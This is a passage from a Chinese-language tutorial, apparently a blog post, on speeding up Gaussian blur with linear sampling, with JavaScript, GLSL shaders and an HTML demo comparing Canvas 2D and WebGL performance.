      <span class="hljs-comment">// éå†ä¼˜åŒ–åçš„é‡‡æ ·ç‚¹ï¼ˆçº¦ä¸ºåŸæ¥çš„ä¸€åŠï¼‰</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> { offset, weight } <span class="hljs-keyword">of</span> optimized) {
        <span class="hljs-comment">// æ¨¡æ‹Ÿ GPU çº¿æ€§æ’å€¼</span>
        <span class="hljs-keyword">const</span> samplePos = x + offset;
        <span class="hljs-keyword">const</span> px1 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(samplePos);
        <span class="hljs-keyword">const</span> px2 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(samplePos);
        <span class="hljs-keyword">const</span> frac = samplePos - px1;

        <span class="hljs-keyword">const</span> px1Clamped = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(px1, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>);
        <span class="hljs-keyword">const</span> px2Clamped = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(px2, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>);

        <span class="hljs-keyword">const</span> idx1 = (y * width + px1Clamped) * <span class="hljs-number">4</span>;
        <span class="hljs-keyword">const</span> idx2 = (y * width + px2Clamped) * <span class="hljs-number">4</span>;

        <span class="hljs-comment">// çº¿æ€§æ’å€¼</span>
        <span class="hljs-keyword">const</span> sr = data[idx1] * (<span class="hljs-number">1</span> - frac) + data[idx2] * frac;
        <span class="hljs-keyword">const</span> sg = data[idx1 + <span class="hljs-number">1</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">1</span>] * frac;
        <span class="hljs-keyword">const</span> sb = data[idx1 + <span class="hljs-number">2</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">2</span>] * frac;
        <span class="hljs-keyword">const</span> sa = data[idx1 + <span class="hljs-number">3</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">3</span>] * frac;

        r += sr * weight;
        g += sg * weight;
        b += sb * weight;
        a += sa * weight;
      }

      <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
      output[outIdx] = r;
      output[outIdx + <span class="hljs-number">1</span>] = g;
      output[outIdx + <span class="hljs-number">2</span>] = b;
      output[outIdx + <span class="hljs-number">3</span>] = a;
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
}
</code></pre>
<h3 data-id="heading-22">WebGL ç€è‰²å™¨å¯¹æ¯”</h3>
<p><strong>ä¼ ç»Ÿæ–¹æ³•ç€è‰²å™¨</strong>ï¼š</p>
<pre><code class="hljs language-glsl" lang="glsl">precision mediump float;
uniform sampler2D u_texture;
uniform float u_texelSize;
uniform float u_kernel[63];
uniform int u_radius;
varying vec2 v_texCoord;

void main() {
  vec4 color = vec4(0.0);
  // éå†æ‰€æœ‰é‡‡æ ·ç‚¹
  for (int i = -31; i &lt;= 31; i++) {
    int absI = i &lt; 0 ? -i : i;
    if (absI &gt; u_radius) continue;
    float weight = u_kernel[i + 31];
    vec2 offset = vec2(float(i) * u_texelSize, 0.0);
    color += texture2D(u_texture, v_texCoord + offset) * weight;
  }
  gl_FragColor = color;
}
</code></pre>
<p><strong>ä¼˜åŒ–æ–¹æ³•ç€è‰²å™¨</strong>ï¼š</p>
<pre><code class="hljs language-glsl" lang="glsl">precision mediump float;
uniform sampler2D u_texture;
uniform float u_texelSize;
uniform float u_offsets[32];
uniform float u_weights[32];
uniform int u_sampleCount;
varying vec2 v_texCoord;

void main() {
  vec4 color = vec4(0.0);
  // éå†ä¼˜åŒ–åçš„é‡‡æ ·ç‚¹ï¼ˆçº¦ä¸ºåŸæ¥çš„ä¸€åŠï¼‰
  for (int i = 0; i &lt; 32; i++) {
    if (i &gt;= u_sampleCount) break;
    float offset = u_offsets[i];
    float weight = u_weights[i];
    vec2 tc = vec2(v_texCoord.x + offset * u_texelSize, v_texCoord.y);
    // GPU è‡ªåŠ¨çº¿æ€§æ’å€¼
    color += texture2D(u_texture, tc) * weight;
  }
  gl_FragColor = color;
}
</code></pre>
<p>å…³é”®åŒºåˆ«ï¼šä¼˜åŒ–æ–¹æ³•ä½¿ç”¨éæ•´æ•°çš„ <code>offset</code>ï¼ŒGPU çš„ <code>texture2D</code> ä¼šè‡ªåŠ¨è¿›è¡Œç¡¬ä»¶çº¿æ€§æ’å€¼ï¼Œæ— éœ€æ‰‹åŠ¨è®¡ç®—ã€‚</p>
<h2 data-id="heading-23">å®Œæ•´ç¤ºä¾‹ä»£ç </h2>
<p>å°†ä»¥ä¸‹ä»£ç ä¿å­˜ä¸º HTML æ–‡ä»¶ï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€å³å¯ä½¿ç”¨ã€‚è¯¥ç¤ºä¾‹åŒ…å« Canvas 2Dï¼ˆCPUï¼‰å’Œ WebGLï¼ˆGPUï¼‰ä¸¤ç§å®ç°ï¼Œå¯ä»¥ç›´è§‚å¯¹æ¯”æ€§èƒ½å·®å¼‚ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>é«˜æ–¯æ¨¡ç³Šå¯¹æ¯”ï¼šCanvas 2D vs WebGL<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    * { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">box-sizing</span>: border-box; }
    <span class="hljs-selector-tag">body</span> {
      <span class="hljs-attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="hljs-string">"Segoe UI"</span>, Roboto, sans-serif;
      <span class="hljs-attribute">background</span>: <span class="hljs-number">#f5f5f5</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
    }
    <span class="hljs-selector-class">.container</span> {
      <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1600px</span>;
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
      <span class="hljs-attribute">background</span>: white;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">30px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);
    }
    <span class="hljs-selector-tag">h1</span> { <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>; }
    <span class="hljs-selector-class">.description</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>; <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>; <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>; }
    <span class="hljs-selector-class">.controls</span> {
      <span class="hljs-attribute">display</span>: grid;
      <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fit, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">background</span>: <span class="hljs-number">#f9f9f9</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
    }
    <span class="hljs-selector-class">.control-group</span> { <span class="hljs-attribute">display</span>: flex; <span class="hljs-attribute">flex-direction</span>: column; <span class="hljs-attribute">gap</span>: <span class="hljs-number">8px</span>; }
    <span class="hljs-selector-tag">label</span> { <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">500</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#555</span>; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>; }
    <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"file"</span>]</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> dashed <span class="hljs-number">#ddd</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
      <span class="hljs-attribute">cursor</span>: pointer;
    }
    <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"range"</span>]</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; }
    <span class="hljs-selector-class">.value-display</span> { <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-attribute">font-weight</span>: bold; <span class="hljs-attribute">color</span>: <span class="hljs-number">#007aff</span>; }
    <span class="hljs-selector-tag">button</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">24px</span>;
      <span class="hljs-attribute">background</span>: <span class="hljs-number">#007aff</span>;
      <span class="hljs-attribute">color</span>: white;
      <span class="hljs-attribute">border</span>: none;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">500</span>;
      <span class="hljs-attribute">cursor</span>: pointer;
      <span class="hljs-attribute">transition</span>: background <span class="hljs-number">0.2s</span>;
    }
    <span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#0051d5</span>; }
    <span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:disabled</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#ccc</span>; <span class="hljs-attribute">cursor</span>: not-allowed; }
    <span class="hljs-selector-class">.results</span> {
      <span class="hljs-attribute">display</span>: grid;
      <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fit, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">280px</span>, <span class="hljs-number">1</span>fr));
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;
    }
    <span class="hljs-selector-class">.result-item</span> { <span class="hljs-attribute">text-align</span>: center; }
    <span class="hljs-selector-class">.result-item</span> <span class="hljs-selector-tag">h3</span> { <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; }
    <span class="hljs-selector-tag">canvas</span> {
      <span class="hljs-attribute">max-width</span>: <span class="hljs-number">100%</span>;
      <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
      <span class="hljs-attribute">display</span>: block;
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
    }
    <span class="hljs-selector-class">.stats</span> {
      <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">background</span>: <span class="hljs-number">#f9f9f9</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">13px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
      <span class="hljs-attribute">text-align</span>: left;
    }
    <span class="hljs-selector-class">.stats-highlight</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#007aff</span>; <span class="hljs-attribute">font-weight</span>: bold; }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>é«˜æ–¯æ¨¡ç³Šå¯¹æ¯”ï¼šCanvas 2D vs WebGL<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"description"</span>&gt;</span>
      ä¸Šä¼ å›¾ç‰‡ï¼Œè°ƒæ•´å‚æ•°ï¼Œå¯¹æ¯” CPUï¼ˆCanvas 2Dï¼‰å’Œ GPUï¼ˆWebGLï¼‰å®ç°çš„æ€§èƒ½ã€‚
      æ¯ç§å®ç°éƒ½åŒ…å«ä¼ ç»Ÿå¯åˆ†ç¦»å·ç§¯å’Œçº¿æ€§é‡‡æ ·ä¼˜åŒ–ä¸¤ä¸ªç‰ˆæœ¬ã€‚
    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"controls"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"control-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"imageUpload"</span>&gt;</span>ä¸Šä¼ å›¾ç‰‡ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"imageUpload"</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">"image/*"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"control-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"sigmaRange"</span>&gt;</span>
          æ ‡å‡†å·® (sigma)ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"value-display"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sigmaValue"</span>&gt;</span>2.0<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"range"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sigmaRange"</span> <span class="hljs-attr">min</span>=<span class="hljs-string">"0.5"</span> <span class="hljs-attr">max</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">step</span>=<span class="hljs-string">"0.5"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"2.0"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"control-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"radiusRange"</span>&gt;</span>
          åŠå¾„ (radius)ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"value-display"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"radiusValue"</span>&gt;</span>6<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"range"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"radiusRange"</span> <span class="hljs-attr">min</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">max</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">step</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"6"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"control-group"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"align-self: end;"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"applyButton"</span> <span class="hljs-attr">disabled</span>&gt;</span>åº”ç”¨æ¨¡ç³Š<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"results"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>åŸå›¾<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"originalCanvas"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Canvas 2D ä¼ ç»Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas2dTraditional"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>é‡‡æ ·æ¬¡æ•°ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c2dTradSamples"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è€—æ—¶ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c2dTradTime"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Canvas 2D ä¼˜åŒ–<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas2dOptimized"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>é‡‡æ ·æ¬¡æ•°ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c2dOptSamples"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è€—æ—¶ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c2dOptTime"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æ€§èƒ½æå‡ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c2dSpeedup"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>WebGL ä¼ ç»Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglTraditional"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>é‡‡æ ·æ¬¡æ•°ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglTradSamples"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è€—æ—¶ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglTradTime"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>WebGL ä¼˜åŒ–<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglOptimized"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>é‡‡æ ·æ¬¡æ•°ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglOptSamples"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è€—æ—¶ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglOptTime"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æ€§èƒ½æå‡ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats-highlight"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"webglSpeedup"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// ==================== é€šç”¨å‡½æ•° ====================</span>

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateGaussianKernel</span>(<span class="hljs-params">radius, sigma</span>) {
      <span class="hljs-keyword">const</span> kernelSize = <span class="hljs-number">2</span> * radius + <span class="hljs-number">1</span>;
      <span class="hljs-keyword">const</span> kernel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(kernelSize);
      <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernelSize; i++) {
        <span class="hljs-keyword">const</span> x = i - radius;
        kernel[i] = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">exp</span>(-(x * x) / (<span class="hljs-number">2</span> * sigma * sigma));
        sum += kernel[i];
      }
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernelSize; i++) {
        kernel[i] /= sum;
      }
      <span class="hljs-keyword">return</span> kernel;
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">optimizeKernel</span>(<span class="hljs-params">kernel</span>) {
      <span class="hljs-keyword">const</span> radius = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(kernel.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);
      <span class="hljs-keyword">const</span> optimized = [];
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernel.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) {
        <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; kernel.<span class="hljs-property">length</span>) {
          <span class="hljs-keyword">const</span> w1 = kernel[i];
          <span class="hljs-keyword">const</span> w2 = kernel[i + <span class="hljs-number">1</span>];
          <span class="hljs-keyword">const</span> wSum = w1 + w2;
          <span class="hljs-keyword">const</span> baseOffset = i - radius;
          <span class="hljs-keyword">const</span> offset = baseOffset + w2 / wSum;
          optimized.<span class="hljs-title function_">push</span>({ offset, <span class="hljs-attr">weight</span>: wSum });
